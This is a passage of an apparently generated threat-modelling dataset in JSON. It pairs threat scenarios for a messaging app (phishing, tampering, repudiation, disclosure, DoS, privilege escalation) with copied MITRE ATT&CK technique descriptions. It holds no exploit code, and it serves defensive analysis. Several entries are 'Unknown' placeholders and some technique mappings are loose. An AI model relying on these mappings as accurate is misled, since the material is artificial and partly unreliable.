                    "Condition": "Users are not sufficiently aware of URL and certificate details."
                }
            ],
            "Potential Impact": "Credential theft and unauthorized access to user accounts.",
            "MITRE ATT&CK Keywords": [
                "doppelganger domain",
                "credential harvesting",
                "phishing website",
                "web spoofing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts the communication between the primary device and a companion device to alter message contents.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network traffic between these devices.",
                    "Role": "Network Attacker",
                    "Condition": "A vulnerable, unencrypted network or an attacker in close proximity."
                },
                {
                    "Assumption": "End-to-end encryption could be bypassed or has vulnerabilities that are exploitable.",
                    "Role": "Cryptographer",
                    "Condition": "There are flaws in the encryption implementation."
                }
            ],
            "Potential Impact": "Tampering of message contents leading to misinformation or manipulation of data.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "packet modification",
                "network eavesdropping",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "SQLite databases storing authentication credentials are accessed and modified by an attacker using a vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database has vulnerabilities that can be exploited.",
                    "Role": "Database Administrator",
                    "Condition": "The database is not updated/patched appropriately."
                },
                {
                    "Assumption": "The attacker has already gained unauthorized access to the device.",
                    "Role": "Attacker",
                    "Condition": "Compromise through other means like malware."
                }
            ],
            "Potential Impact": "Authentication credentials tampered, leading to unauthorized system access.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "credential manipulation",
                "data corruption",
                "exploit vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the messaging application's binary to alter its functionality.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access and modify the application binaries.",
                    "Role": "Attacker",
                    "Condition": "Local admin rights or root access are utilized by the attacker."
                },
                {
                    "Assumption": "The integrity of application binaries is not verified before loading.",
                    "Role": "Developer",
                    "Condition": "No integrity checks such as code signing are implemented."
                }
            ],
            "Potential Impact": "Corruption of application integrity leading to data breaches or further malware propagation.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "binary modification",
                "application tampering",
                "malware persistence"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a particular message by claiming their device was compromised by an unknown attacker.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks detailed logging or message authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Logs are either insufficient or non-verifiable."
                },
                {
                    "Assumption": "Users have plausible deniability in the claim of compromise.",
                    "Role": "User",
                    "Condition": "There has been previous instance of similar attack."
                }
            ],
            "Potential Impact": "Non-repudiation issues leading to disputes and potential legal challenges.",
            "MITRE ATT&CK Keywords": [
                "message repudiation",
                "log evasion",
                "credential abuse",
                "identity misrepresentation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider with valid access deletes or alters logs related to message transactions to erase evidence.",
            "Assumptions": [
                {
                    "Assumption": "The insider has sufficient privileges to access and modify logs.",
                    "Role": "Insider",
                    "Condition": "Authorized access due to job responsibilities."
                },
                {
                    "Assumption": "Logging mechanisms lack tamper-evident protections.",
                    "Role": "System Designer",
                    "Condition": "Logs are not centralized or protected."
                }
            ],
            "Potential Impact": "Potential loss of forensic evidence and accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "insider threat",
                "tamper-evident bypass",
                "data destruction"
            ],
            "mitre_technique": {
                "name": "Data Destruction",
                "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",
                "id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
                "technique_id": "T1485"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains access to a user's account and sends malicious messages, making it difficult to prove whether the original user sent them.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows or can guess user authentication details.",
                    "Role": "Attacker",
                    "Condition": "Passwords are weak or reused."
                },
                {
                    "Assumption": "There are no robust multi-factor authentication methods enforced.",
                    "Role": "System Designer",
                    "Condition": "Only single-factor authentication is used."
                }
            ],
            "Potential Impact": "Compromise of account integrity and false attribution.",
            "MITRE ATT&CK Keywords": [
                "credential misuse",
                "account compromise",
                "message forgery",
                "security evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "SQLite database files are accessed by an unauthorized user who extracts sensitive information from them.",
            "Assumptions": [
                {
                    "Assumption": "The database encryption is weak or improperly configured.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of updates and security patches."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the file storage.",
                    "Role": "Attacker",
                    "Condition": "Device is compromised or not secured."
                }
            ],
            "Potential Impact": "Leakage of sensitive user data including messages and credentials.",
            "MITRE ATT&CK Keywords": [
                "database access",
                "sensitive data exposure",
                "unauthorized file access",
                "information stealing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted backup files sent from the mobile application to cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "The backup files are not encrypted before transmission.",
                    "Role": "System Designer",
                    "Condition": "Backup processes lack encryption protocols."
                },
                {
                    "Assumption": "The attacker can intercept the network traffic between devices and cloud storage.",
                    "Role": "Network Attacker",
                    "Condition": "Man-in-the-middle capabilities or vulnerable network."
                }
            ],
            "Potential Impact": "Unauthorized access to entire datasets of user communications.",
            "MITRE ATT&CK Keywords": [
                "backup file interception",
                "data exfiltration",
                "man-in-the-middle",
                "network packet capture"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the messaging application's cryptographic library to decrypt message contents.",
            "Assumptions": [
                {
                    "Assumption": "A cryptographic vulnerability is present and exploitable.",
                    "Role": "Cryptographer",
                    "Condition": "The cryptographic library has known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The attacker is capable of executing the exploit.",
                    "Role": "Attacker",
                    "Condition": "Necessary tools and knowledge are available."
                }
            ],
            "Potential Impact": "Compromise of message confidentiality, revealing sensitive information.",
            "MITRE ATT&CK Keywords": [
                "cryptographic exploitation",
                "decryption",
                "vulnerability exploitation",
                "information retrieval"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targeting the messaging application's server infrastructure, resulting in downtime.",
            "Assumptions": [
                {
                    "Assumption": "The infrastructure lacks adequate DDoS protection mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient resource allocation for DDoS mitigation."
                },
                {
                    "Assumption": "The attacker has access to a botnet or sufficient resources.",
                    "Role": "Attacker",
                    "Condition": "Botnet or resource pool is under attacker's control."
                }
            ],
            "Potential Impact": "Service unavailability and potential loss of business continuity.",
            "MITRE ATT&CK Keywords": [
                "distributed denial of service",
                "server overload",
                "network traffic flood",
                "infrastructure disruption"
            ],
            "mitre_technique": {
                "name": "Botnet",
                "description": "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)",
                "id": "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074",
                "technique_id": "T1583.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of a specific vulnerability in the messaging application's protocol leading to resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "The application protocol has an unpatched flaw leading to exhaustion.",
                    "Role": "System Designer",
                    "Condition": "Flaw exists due to oversight or missed updates."
                },
                {
                    "Assumption": "The attacker can repeatedly trigger the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the vulnerability and its exploit."
                }
            ],
            "Potential Impact": "Interruption of communication services and loss of application functionality.",
            "MITRE ATT&CK Keywords": [
                "protocol exploitation",
                "resource exhaustion",
                "application crash",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actor repeatedly sends large volumes of data to specific users via the messaging application, causing client-side crashes.",
            "Assumptions": [
                {
                    "Assumption": "The application does not regulate data throttling or handling large message volumes efficiently.",
                    "Role": "Developer",
                    "Condition": "Lack of efficient data handling mechanisms."
                },
                {
                    "Assumption": "The attacker has or controls accounts to execute this.",
                    "Role": "Attacker",
                    "Condition": "Compromised or multiple throwaway accounts."
                }
            ],
            "Potential Impact": "Interruption in user communication and degradation of service quality.",
            "MITRE ATT&CK Keywords": [
                "application crash",
                "client-side exploit",
                "high volume data",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A non-administrative user exploits privilege escalation vulnerability to gain administrative access to the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The operating system or the application contains an unpatched privilege escalation vulnerability.",
                    "Role": "System Administrator",
                    "Condition": "Infrequent or delayed patching cycles."
                },
                {
                    "Assumption": "The attacker is aware of and can exploit the vulnerability successfully.",
                    "Role": "Attacker",
                    "Condition": "Necessary knowledge and tools are available."
                }
            ],
            "Potential Impact": "Full compromise of the application, leading to unauthorized access and control.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "administrative access",
                "vulnerability exploitation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the companion device's authentication process to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "There exists a vulnerability in the companion device's authentication mechanism.",
                    "Role": "System Designer",
                    "Condition": "Flawed implementation or missed updates."
                },
                {
                    "Assumption": "The attacker has detailed knowledge of the authentication mechanism.",
                    "Role": "Attacker",
                    "Condition": "Access to documentation or reverse engineering capabilities."
                }
            ],
            "Potential Impact": "Unauthorized control over the companion device and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "authentication bypass",
                "elevated privileges",
                "vulnerability exploitation",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker with limited access installs rootkit malware on the primary device, escalating their privileges.",
            "Assumptions": [
                {
                    "Assumption": "The primary device allows the installation of software without stringent checks.",
                    "Role": "Device Security Policy Maker",
                    "Condition": "Lax or non-existent application whitelisting."
                },
                {
                    "Assumption": "The attacker is able to trick the user into installing the rootkit.",
                    "Role": "Attacker",
                    "Condition": "Social engineering or exploitation of another vulnerability."
                }
            ],
            "Potential Impact": "Complete control over the primary device, leading to data breaches and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "rootkit installation",
                "privilege escalation",
                "malware persistence",
                "full device compromise"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing techniques to obtain a user's private key file from their mobile device.",
            "Assumptions": [
                {
                    "Assumption": "The user is susceptible to phishing attacks.",
                    "Role": "User",
                    "Condition": "The user does not recognize or ignore warnings about suspicious links or attachments."
                },
                {
                    "Assumption": "The mobile device lacks adequate anti-phishing protection.",
                    "Role": "Mobile Device",
                    "Condition": "The device does not have security software to detect and prevent phishing."
                },
                {
                    "Assumption": "The attacker is able to create a convincing phishing email or message.",
                    "Role": "Attacker",
                    "Condition": "The attacker possesses adequate skills in social engineering."
                }
            ],
            "Potential Impact": "Compromise of message confidentiality and integrity",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "identity theft",
                "credential theft",
                "mobile"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the identity of a legitimate service provider to intercept and relay messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a compromised certificate authority.",
                    "Role": "Attacker",
                    "Condition": "The certificate authority has been breached or subverted."
                },
                {
                    "Assumption": "The user does not verify the authenticity of the service provider's identity.",
                    "Role": "User",
                    "Condition": "The user accepts fake certificates without verification."
                },
                {
                    "Assumption": "The communication channels are not adequately verified.",
                    "Role": "Service Provider",
                    "Condition": "The messaging applications do not enforce strict certificate validation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "spoofing",
